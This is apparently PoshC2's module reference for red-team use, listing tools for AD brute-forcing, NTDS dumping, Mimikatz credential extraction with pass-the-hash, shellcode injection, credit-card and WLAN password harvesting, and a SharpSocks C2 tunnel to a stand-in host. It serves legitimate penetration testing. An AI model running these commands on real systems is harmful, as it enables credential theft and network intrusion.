#############
  Brute-AD
#############
*********
SYNOPSIS
*********
Brute forces active directory user accounts.

* Dave Hardy @davehardy20

************
DESCRIPTION
************
Bruteforce all accounts in AD with a given password or list of passwords.

*********
EXAMPLES
*********
.. code-block:: powershell

	Brute-Ad

.. code-block:: powershell

 	Brute-Ad -list 'Password1','Password12345','Password123'

################
Brute-LocAdmin
################
*********
SYNOPSIS
*********
Brute-forces local Administrator account.

* Dave Hardy @davehardy20

************
DESCRIPTION
************
Brute-forces local Administrator account, if no name is provided it will attempt to find this by searching the local administrators group using WMI.

*********
EXAMPLES
*********
.. code-block:: powershell

	Brute-LocAdmin

.. code-block:: powershell

 	Brute-LocAdmin -Username Adm-User

################
CVE-2016-9192
################
*********
SYNOPSIS
*********
Attempts to exploit cve-2016-9192 which misuses a side loading vulnearbility in Cisco Anyconnects vpnupdater

* Ben Turner @benpturner 

************
DESCRIPTION
************
Attempts to exploit cve-2016-9192 which misuses a side loading vulnearbility in Cisco Anyconnects vpnupdater. This module drops a DLL to disk that will only create a file to prove the exploit works under the root of C:  
    
Script Author: Ben Turner @benpturner
POC: Proof-of-concept and initial code from https://github.com/serializingme/cve-2016-9192

*********
EXAMPLES
*********
.. code-block:: powershell

    Invoke-CVE-2016-919

.. code-block:: powershell
	
	Invoke-CVE-2016-919 -CustomDLL <path to dll>

################
Decrypt-RDCMan
################
*********
SYNOPSIS
*********
This script should be able to decrpt all passwords stored in the RDCMan config file.

* Ben Turner @benpturner 
* Rich Hicks @scriptmonkey_

************
DESCRIPTION
************
This script should be able to decrpt all passwords stored in the RDCMan config file.

*********
EXAMPLES
*********
.. code-block:: powershell

	Decrypt-RDCMan -FilePath

#############
Dump-NTDS
#############
*********
SYNOPSIS
*********
Dumps the active directory dit using ntdsutil.

* Ben Turner @benpturner 

************
DESCRIPTION
************
Dumps the active directory dit using ntdsutil.

*********
EXAMPLES
*********
.. code-block:: powershell

	Dump-NTDS -EmptyFolder "C:\Temp\NTDS\"

###################
Get-CreditCardData
###################
*********
SYNOPSIS
*********
Searches recursively through the provided path searching for valid credit card numbers.

* Ben Turner @benpturner 

************
DESCRIPTION
************
Large files are read in chunks so as to not exhaust system resources.


*********
EXAMPLES
*********
.. code-block:: powershell

	Get-CreditCardData -Path "C:\Backup\"

###################
Get-FirewallRules
###################
*********
SYNOPSIS
*********
Returns all firewall rules

************
DESCRIPTION
************
Returns all firewall rules

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-FirewallRule -Enabled $true | sort direction,applicationName,name

#############
Get-IdleTime
#############
*********
SYNOPSIS
*********
Returns idle time of machine, uses Add-Type therefore not OpSec aware.

************
DESCRIPTION
************
Returns idle time of machine, uses Add-Type therefore not OpSec aware.

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-IdleTime

#############
Get-LocAdm
#############
*********
SYNOPSIS
*********
Returns members of the Local Admins group from Active Directory.

* Dave Hardy - @DaveHardy20

************
DESCRIPTION
************
Retrieves all computers from Active Direcrory and searches and returns the members of the Local Admins group.

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-LocAdm

################
Get-PassNotExp
################
*********
SYNOPSIS
*********
Identify accounts with passwords set not to expire

* Dave Hardy - @DaveHardy20

************
DESCRIPTION
************
Searches Active Directory for user accounts the have the flag set to allow the password never to expire

*********
EXAMPLES
*********
.. code-block:: powershell

	Pass-NotExp

#############
Get-PassPol
#############
*********
SYNOPSIS
*********
Retrives the default active directory password policy.

* Dave Hardy - @DaveHardy20

************
DESCRIPTION
************
Retrives the default active directory password policy.

*********
EXAMPLES
*********
.. code-block:: powershell

	GetPass-Pol

################
Get-RecentFiles
################
*********
SYNOPSIS
*********
Retrives the recent files that have been used by the user.

* Dave Hardy - @DaveHardy20

************
DESCRIPTION
************
Retrives the recent files that have been used by the user.

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-RecentFiles

###################
Get-ServicePerms
###################
*********
SYNOPSIS
*********
Service Permissions Checker, outputs an HTML file in the same directory as executed. 

* Ben Turner @benpturner 

************
DESCRIPTION
************
Service Permissions Checker, outputs an HTML file in the same directory as executed. 

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-ServicePerms

#############
Get-UserInfo
#############
Dumps all local users, local groups and their memberships using WMI. Similar to using net.exe but without calling it. 

* Ben Turner @benpturner 

************
DESCRIPTION
************
Dumps all local users, local groups and their memberships using WMI. Similar to using net.exe but without calling it. 

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-UserInfo

#############
Get-WLANPass
#############
*********
SYNOPSIS
*********
Retrives password from stored wlan profiles.

************
DESCRIPTION
************
Retrives password from stored wlan profiles.

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-WLANPass

###################
Inject-Shellcode
###################
*********
SYNOPSIS
*********
Powershell module to inject shellcode using CreateRemoteThread and falls back to using RtlCreateUserThread.

* Ben Turner @benpturner 

************
DESCRIPTION
************
Powershell module to inject shellcode using CreateRemoteThread and falls back to using RtlCreateUserThread.

Injects shellcode into x86 or x64 bit processes. Tested on Windowns 7 32 bit, Windows 7 64 bit and Windows 10 64bit.

*********
EXAMPLES
*********
.. code-block:: powershell

	Inject-Shellcode -x86 -Shellcode (GC "C:\Temp\Shellcode.bin" -Encoding byte)

.. code-block:: powershell

	Inject-Shellcode -x86 -Shellcode (GC "C:\Temp\Shellcode.bin" -Encoding byte) -ProcID 5634

.. code-block:: powershell

	Inject-Shellcode -x86 -Shellcode (GC "C:\Temp\Shellcode.bin" -Encoding byte) -ProcessPath "C:\Windows\System32\notepad.exe"

.. code-block:: powershell

	Inject-Shellcode -Shellcode (GC "C:\Temp\Shellcode.bin" -Encoding byte) -ProcessName notepad.exe

##################
Invoke-Arpscan
##################
*********
SYNOPSIS
*********
Powershell ArpScanner module.

* Ben Turner @benpturner 
* Rob Maslen @rbmaslen 

************
DESCRIPTION
************
Powershell ArpScanner using C# AssemblyLoad. This uses [DllImport("iphlpapi.dll", ExactSpelling=true)] to Export 'SendARP'

By default it will loop through all interfaces and perform an arpscan of the local network based on the IP Address and Subnet mask provided by the network adaptor. 

The C# Code has been included but for OpSec purposes it uses AssemblyLoad and not AddType.

*********
EXAMPLES
*********
.. code-block:: powershell

	Invoke-Arpscan

.. code-block:: powershell

	Invoke-Arpscan -IPCidr 10.0.0.1/24

################
Invoke-Hostscan
################
*********
SYNOPSIS
*********
Scans hosts using TCP port 445 for Windows (SMB).

* Ben Turner @benpturner 

************
DESCRIPTION
************
Scans hosts using TCP port 445 for Windows (SMB).

*********
EXAMPLES
*********
.. code-block:: powershell

	Invoke-Hostscan -IPRangeCIDR 172.16.10.0/24

################
Invoke-Pipekat
################
*********
SYNOPSIS
*********
The Invoke-Pipekat module uses Named Pipes and WMI to extract credentials using the famous @gentilkiwi tool and Invoke-WMIExec from @kevin_robertson.

* Ben Turner @benpturner

************
DESCRIPTION
************
When you are running as a low-level user but have obtained highly privileged credntials and you want to extract credentials from memory or use any of the features of the famous tool from @gentilkiwi without touching disk or loading from an external source. This uses named pipes to communicate between process and then uses WMI to elevate up on the localhost using the supplied credentials. Default timeout 30 seconds for the clinet pipe and 600 seconds for the server pipe.

*********
EXAMPLES
*********
.. code-block:: powershell

	Invoke-Pipekat -Username Admin -Password Password1 -Domain .

.. code-block:: powershell

	Invoke-Pipekat -Target 10.0.0.100 -Username Admin -Password Password1 -Domain .

.. code-block:: powershell

	Invoke-Pipekat -Username Admin -Password Password1 -Domain . -Command "lsadump::cache" -PSexec $True

.. code-block:: powershell

	Invoke-Pipekat -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Command "lsadump::cache" -PSexec $True

.. code-block:: powershell

	Invoke-Pipekat -Target 10.0.0.1 -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Shellcode ZnVuY3Rpb24gSW52b2tlL -Timeout 15 -TimeoutServer 900

######################
Invoke-WinRMSession
######################
*********
SYNOPSIS
*********
Attempts to create a new WinRM session against a remote host using a username / password combination. 

* Ben Turner @benpturner 

************
DESCRIPTION
************
Attempts to create a new WinRM session against a remote host using a username / password combination. 

Please note, this requires WinRM to be setup on both hosts prior to execution. 

*********
EXAMPLES
*********
.. code-block:: powershell

	Invoke-WinRMSession -Username <username> -Password <password> -IPAddress <ipaddress>

###################
Invoke-WMIChecker
###################
*********
SYNOPSIS
*********
WMI Command over Windows RPC Ports (TCP 135) - @benpturner

************
DESCRIPTION
************
WMI Tool written to search for files younger than a month on network shares. This also searches is the current logged in user is part of the Local Administrators group. All communications is done over Windows RPC Ports (TCP 135)

*********
EXAMPLES
*********
.. code-block:: powershell

	Invoke-WMIChecker -IPAddress 172.16.0.205

.. code-block:: powershell

	Invoke-WMIChecker -IPRangeCIDR 172.16.0.0/22 -Threads 100 -Command "cmd /c echo 1"
	
###################
Invoke-WMICommand
###################
*********
SYNOPSIS
*********
Powershell ArpScanner module.

* Ben Turner @benpturner 
* Rob Maslen @rbmaslen 

************
DESCRIPTION
************

*********
EXAMPLES
*********
.. code-block:: powershell

	
#############
NamedPipe
#############
*********
SYNOPSIS
*********
Module used in PoshC2 to create a named pipe. 

* Ben Turner @benpturner 

************
DESCRIPTION
************
Module used in PoshC2 to create a named pipe. 
	
################
NamedPipeDaisy
################
*********
SYNOPSIS
*********
Module used in PoshC2 to create a named pipe used in DaisyChaining. 

* Ben Turner @benpturner 

************
DESCRIPTION
************
Module used in PoshC2 to create a named pipe used in DaisyChaining.
	
################
NamedPipeProxy
################
*********
SYNOPSIS
*********
Module used in PoshC2 to create a named pipe used for ProxyPayloads.

* Ben Turner @benpturner 

************
DESCRIPTION
************
Module used in PoshC2 to create a named pipe used for ProxyPayloads. 
	
#############
PortScanner
#############
*********
SYNOPSIS
*********
QuickPortScan / EgressBuster written in C#.

* Rob Maslen @rbmaslen 

************
DESCRIPTION
************
QuickPortScan / EgressBuster written in C#.

*********
EXAMPLES
*********

.. code-block:: powershell

	PortScan -IPaddress <IPaddress> -Ports <Ports> -maxQueriesPS <maxQueriesPS> -Delay <Delay>

.. code-block:: powershell

	PortScan -IPaddress 127.0.0.1 -Ports 1-65535 -maxQueriesPS 10000

.. code-block:: powershell

	PortScan -IPaddress 192.168.1.0/24 -Ports 1-65535 -maxQueriesPS 10000

.. code-block:: powershell

	PortScan -IPaddress 192.168.1.1-50 -Ports "80,443,55" -maxQueriesPS 10000

.. code-block:: powershell

	PortScan -IPaddress 192.168.1.1-50 -Ports "80,443,55" -maxQueriesPS 1 -Delay 1
	
#############
SharpSocks
#############
*********
SYNOPSIS
*********
Socks Proxy written in C# for .NET v4.

* Rob Maslen @rbmaslen 

************
DESCRIPTION
************
Socks Proxy written in C# for .NET v4.

Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via PowerShell

`https://labs.nettitude.com/blog/poshc2-v3-with-socks-proxy-sharpsocks <https://labs.nettitude.com/blog/poshc2-v3-with-socks-proxy-sharpsocks/>`_

*********
EXAMPLES
*********
.. code-block:: powershell

	SharpSocks -Uri "http://www.c2.com:9090" -Beacon 2000 -Insecure
		
###################
Test-ADCredential
###################
*********
SYNOPSIS
*********
Small powershell function to test any provided Active Directory credentials using System.DirectoryServices.AccountManagement.

* Ben Turner @benpturner 

************
DESCRIPTION
************
Small powershell function to test any provided Active Directory credentials using System.DirectoryServices.AccountManagement.

*********
EXAMPLES
*********
.. code-block:: powershell

	Test-ADCredential -Username <username> -Password <password> -Domain <domain>
	
################
Service-Perms
################
*********
SYNOPSIS
*********
Service Permissions Checker, outputs an HTML file in the same directory as executed. 

* Ben Turner @benpturner 

************
DESCRIPTION
************
Service Permissions Checker, outputs an HTML file in the same directory as executed. 

*********
EXAMPLES
*********
.. code-block:: powershell

	Get-ServicePerms
	
#######
Zippy
#######
*********
SYNOPSIS
*********
Using Powershell v3 this Expands and Creates new Zip Files.

************
DESCRIPTION
************
Using Powershell v3 this Expands and Creates new Zip Files.

*********
EXAMPLES
*********
.. code-block:: powershell

	New-ZipFile

.. code-block:: powershell

	Expand-ZipFile

##################
External Modules
##################
* `BloodHound.ps1 <https://github.com/BloodHoundAD/Bloodhound/wiki>`_
* `Bypass-UAC.ps1 <https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Bypass-UAC.ps1>`_
* `ConvertTo-Shellcode.ps1 <https://github.com/monoxgas/sRDI>`_
* `Get-ComputerInfo <https://gallery.technet.microsoft.com/scriptcenter/Get-ComputerInfo-Query-23dd6042>`_
* `Get-GPPAutologon.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1>`_
* `Get-GPPPassword.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1>`_
* `Get-Keystrokes.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1>`_
* `Get-MSHotFixes.ps1 <https://gallery.technet.microsoft.com/scriptcenter/PowerShell-script-to-list-0955fe87>`_
* `Get-Netstat <https://github.com/rgel/PowerShell/blob/master/SysAdminTools/Get-NetStat.ps1>`_
* `HostEnum.ps1 <http://threatexpress.com/2017/05/invoke-hostenum/>`_
* `Inveigh-Relay.ps1 <https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Relay.ps1>`_
* `Inveigh.ps1 <https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh.ps1>`_
* `Invoke-DCSync.ps1 <https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1>`_
* `Invoke-EventVwrBypass.ps1 <https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1>`_
* `Invoke-Mimikatz.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1>`_
* `Invoke-MS16-032.ps1 <https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1>`_
* `Invoke-Portscan.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1>`_
* `Invoke-PowerDump.ps1 <https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1>`_
* `Invoke-PsExec.ps1 <https://github.com/Kevin-Robertson/Invoke-TheHash>`_
* `Invoke-PSInject.ps1 <https://github.com/EmpireProject/Empire/blob/master/data/module_source/management/Invoke-PSInject.ps1>`_
* `Invoke-ReflectivePEInjection.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1>`_
* `Invoke-ReverseDnsLookup.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-ReverseDnsLookup.ps1>`_
* `Invoke-RunAs.ps1 <https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1>`_
* `Invoke-Shellcode.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1>`_
* `Invoke-SMBExec.ps1 <https://github.com/Kevin-Robertson/Invoke-TheHash>`_
* `Invoke-Sniffer.ps1 <https://github.com/Kevin-Robertson>`_
* `Invoke-SqlQuery.ps1 <https://www.powershellgallery.com/packages/PSCommonSql/1.0.1/Content/Invoke-SqlQuery.ps1>`_
* `Invoke-Tater.ps1 <https://github.com/Kevin-Robertson/Tater>`_
* `Invoke-TheHash.ps1 <https://github.com/Kevin-Robertson/Invoke-TheHash>`_
* `Invoke-TokenManipulation.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1>`_
* `Invoke-WMIExec.ps1 <https://github.com/Kevin-Robertson/Invoke-TheHash>`_
* `Invoke-WScriptBypassUAC.ps1 <https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-WScriptBypassUAC.ps1>`_
* `Out-Minidump.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1>`_
* `PowerUp.ps1 <https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1>`_
* `PowerView.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>`_
* `Set-LHSTokenPrivilege.ps1 <https://gallery.technet.microsoft.com/Adjusting-Token-Privileges-9b6724fc>`_
* `Sherlock.ps1 <https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1>`_




